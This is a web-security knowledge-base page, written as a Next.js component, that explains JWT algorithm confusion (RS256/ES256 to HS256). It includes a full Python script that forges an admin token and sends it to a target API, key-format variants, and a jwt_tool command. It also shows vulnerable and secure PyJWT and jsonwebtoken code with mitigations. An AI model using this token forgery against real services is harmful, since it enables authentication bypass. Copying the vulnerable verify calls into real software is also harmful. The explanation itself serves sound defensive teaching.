import type { Metadata } from "next";
import { pageMeta } from "@/lib/seo";
import { KbArticle, H2, H3, P, Mono, Ref, ImpactBox, CodeBlock, InfoCallout } from "@/components/kb";

export const metadata: Metadata = pageMeta(
  "Algorithm Confusion RS256 → HS256",
  "Switch alg from RS256 to HS256 - the library treats the RSA public key as the HMAC secret, which the attacker already knows.",
  "/knowledge-base/algorithm-confusion",
);

export default function Page() {
  return (
    <KbArticle slug="algorithm-confusion">

      <H2>The asymmetric/symmetric mismatch</H2>
      <P>
        Algorithm confusion (also called "key confusion") exploits the fact that some JWT libraries
        accept any algorithm value from the token header and use it to select the verification function -
        even when the application is configured exclusively for asymmetric (RS256/ES256) signing.
      </P>
      <P>
        The attack scenario: a server uses RS256 with an RSA private key to sign tokens.
        Its RSA public key is published (at <Mono>/.well-known/jwks.json</Mono> or similar).
        An attacker changes the token's <Mono>alg</Mono> from <Mono>RS256</Mono> to <Mono>HS256</Mono>
        and signs the forged payload using HMAC-SHA256 with the RSA public key as the HMAC secret.
        The server, not enforcing its expected algorithm, then verifies the HMAC using the same public key
        - and it matches.
      </P>
      <InfoCallout variant="danger" title="The public key is supposed to be public">
        The entire point of asymmetric cryptography is that the public key can be freely distributed.
        Algorithm confusion turns this design property into a vulnerability - the attacker knows the
        "secret" used for verification by definition.
      </InfoCallout>

      <H2>Why it works: the math</H2>
      <P>
        RS256 verification computes: <Mono>RSASSA-PKCS1-v1_5-VERIFY(public_key, message, signature)</Mono>.
        HS256 verification computes: <Mono>HMAC-SHA256(secret, message) == signature</Mono>.
        When a library switches from RS256 to HS256 based on the token's <Mono>alg</Mono> claim,
        it passes the <em>same key material</em> - the RSA public key - to the HMAC function.
        The public key is typically 294-526 bytes of PEM-encoded data. The attacker uses the same bytes
        as the HMAC secret to produce a signature that verifies correctly.
      </P>
      <CodeBlock language="python" label="Full attack - RS256 → HS256" code={`import hmac, hashlib, base64, json, requests

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# Step 1: Fetch the server's public key
# Common locations: /.well-known/jwks.json, /oauth/jwks, /api/.well-known/openid-configuration
response = requests.get("https://target.example.com/.well-known/jwks.json")
# Extract the PEM-encoded public key from the JWK (use jwt_arsenal or python-jwcrypto)
public_key_pem = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Step 2: Forge the payload
header  = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}))
payload = b64url(json.dumps({
    "sub": "admin",
    "role": "superuser",
    "exp": 9999999999
}))

# Step 3: Sign with the public key as HMAC secret
signing_input = f"{header}.{payload}".encode()
sig = hmac.new(public_key_pem, signing_input, hashlib.sha256).digest()

forged_token = f"{header}.{payload}.{b64url(sig)}"
print("Forged token:", forged_token)

# Step 4: Send the forged token
r = requests.get("https://target.example.com/api/admin",
    headers={"Authorization": f"Bearer {forged_token}"})
print(r.status_code, r.text)  # 200 → exploited`} />

      <H2>Key format details matter</H2>
      <P>
        The exact bytes used as the HMAC secret must match what the server passes to its HMAC function.
        Libraries typically pass the public key in one of three formats - and using the wrong one produces
        an invalid signature:
      </P>
      <CodeBlock language="python" label="Key format variants to try" code={`# Variant 1: PEM-encoded (most common)
secret = b"""-----BEGIN PUBLIC KEY-----\nMIIBIjAN...\n-----END PUBLIC KEY-----\n"""

# Variant 2: PEM without trailing newline
secret = b"""-----BEGIN PUBLIC KEY-----\nMIIBIjAN...\n-----END PUBLIC KEY-----"""

# Variant 3: DER-encoded (raw bytes, no PEM wrapping)
import base64
der_b64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA..."
secret = base64.b64decode(der_b64)

# Try all three - the correct one produces a valid signature.
# jwt_tool automates this: python3 jwt_tool.py <JWT> -X k -pk public.pem`} />

      <H2>ECDSA variant: ES256 → HS256</H2>
      <P>
        The same attack applies to ES256 (ECDSA P-256). The EC public key is shorter (~91 bytes in PEM form),
        but the attack mechanics are identical - change <Mono>alg</Mono> from <Mono>ES256</Mono> to <Mono>HS256</Mono>
        and sign with the EC public key as the HMAC secret.
      </P>
      <CodeBlock language="python" label="ES256 → HS256 attack" code={`# EC public key PEM (shorter than RSA)
ec_public_key_pem = b"""-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
-----END PUBLIC KEY-----"""

header  = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}))
payload = b64url(json.dumps({"sub": "admin", "exp": 9999999999}))

sig = hmac.new(ec_public_key_pem, f"{header}.{payload}".encode(),
               hashlib.sha256).digest()
forged = f"{header}.{payload}.{b64url(sig)}"`} />

      <H2>PS256 / RS384 / RS512 variants</H2>
      <P>
        Libraries that do not enforce specific algorithm families may also be confused from
        RS256 to RS384/RS512 (different hash functions over the same RSA operation) or from RSA to
        PS256 (RSA-PSS). These variants are less common because the key type remains RSA and the
        confusions are subtler - but they have appeared in real library implementations.
      </P>

      <H2>Vulnerable library behaviour</H2>
      <CodeBlock language="python" label="Python - PyJWT (vulnerable)" code={`import jwt

# No algorithms kwarg → PyJWT accepts any alg from token header
payload = jwt.decode(token, public_key, options={"verify_signature": True})
# When token has alg=HS256, PyJWT uses public_key as the HMAC secret
# → attacker who signed with that key passes verification`} />
      <CodeBlock language="python" label="Python - PyJWT (secure)" code={`payload = jwt.decode(
    token,
    public_key,
    algorithms=["RS256"],   # strict allowlist - rejects HS256
    audience="api.example.com"
)`} />
      <CodeBlock language="js" label="Node.js - jsonwebtoken (vulnerable)" code={`// No algorithms option in jwt.verify() → accepts algorithm from token header
const decoded = jwt.verify(token, publicKey);
// If token has alg=HS256, publicKey is used as HMAC secret → bypass`} />
      <CodeBlock language="js" label="Node.js - jsonwebtoken (secure)" code={`const decoded = jwt.verify(token, publicKey, {
  algorithms: ['RS256'],   // rejects HS256
  audience:   'api.example.com',
  issuer:     'auth.example.com',
});`} />

      <ImpactBox title="Real-world cases">
        <ul className="refs-list" style={{ lineHeight: 2 }}>
          <li>Auth0 and Okta confirmed real production deployments were vulnerable before the 2015 coordinated disclosure</li>
          <li>PortSwigger Research (2022) demonstrated practical exploitation against modern libraries still lacking strict algorithm enforcement</li>
          <li>Multiple bug bounty reports on HackerOne targeting SSO integrations and API gateway products</li>
          <li>Particularly impactful in OAuth 2.0 / OIDC deployments where the public key is published by design</li>
        </ul>
      </ImpactBox>

      <H2>Mitigations</H2>
      <ul className="refs-list" style={{ fontSize: "14px", color: "var(--text-muted)", lineHeight: 2, marginBottom: "24px" }}>
        <li>Always pass an explicit <Mono>algorithms</Mono> allowlist - a single algorithm, not a family</li>
        <li>Use separate key objects for symmetric and asymmetric algorithms - never pass an RSA key to an HS256 verifier</li>
        <li>Store the expected algorithm server-side alongside the key, not in the token</li>
        <li>If using JWKS, validate that each key's <Mono>alg</Mono> field matches the expected algorithm before using it</li>
        <li>Prefer modern libraries (jose, python-jose) that enforce algorithm binding by key type</li>
      </ul>

      <div>
        <div style={{ fontSize: "12px", fontWeight: 600, color: "var(--text-muted)", marginBottom: "12px", textTransform: "uppercase", letterSpacing: "0.06em" }}>References</div>
        <ul className="refs-list" style={{ fontSize: "13px", color: "var(--text-muted)", lineHeight: 2 }}>
          <li><Ref href="https://portswigger.net/web-security/jwt/algorithm-confusion">PortSwigger - Algorithm confusion attacks</Ref></li>
          <li><Ref href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/">Auth0 - Critical vulnerabilities in JWT libraries</Ref></li>
          <li><Ref href="https://www.rfc-editor.org/rfc/rfc7518#section-3">RFC 7518 §3 - Cryptographic Algorithms for JWS</Ref></li>
          <li><Ref href="https://www.nccgroup.com/us/research-blog/jwt-algorithm-confusion-attack/">NCC Group - JWT Algorithm Confusion</Ref></li>
        </ul>
      </div>

    </KbArticle>
  );
}
